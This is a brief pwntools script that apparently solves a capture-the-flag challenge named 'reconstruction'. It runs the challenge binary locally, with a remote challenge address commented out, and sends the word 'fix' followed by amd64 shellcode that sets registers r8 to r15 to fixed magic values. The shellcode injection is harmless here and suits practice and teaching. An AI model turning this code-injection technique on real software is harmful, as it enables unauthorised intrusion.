from pwn import *

context.clear(arch='amd64', terminal = ['tmux', 'splitw', '-fh'])

p = process('./reconstruction')
#p = remote('83.136.254.160', 33472)

p.sendline(b'fix')

input = asm('''
	mov r8, 0x1337c0de
	mov r9, 0xdeadbeef
	mov r10, 0xdead1337
	mov r12, 0x1337cafe
	mov r13, 0xbeefc0de
	mov r14, 0x13371337
	mov r15, 0x1337dead
	ret
''')

p.send(input)

print(p.recv(1024).decode())

p.interactive()

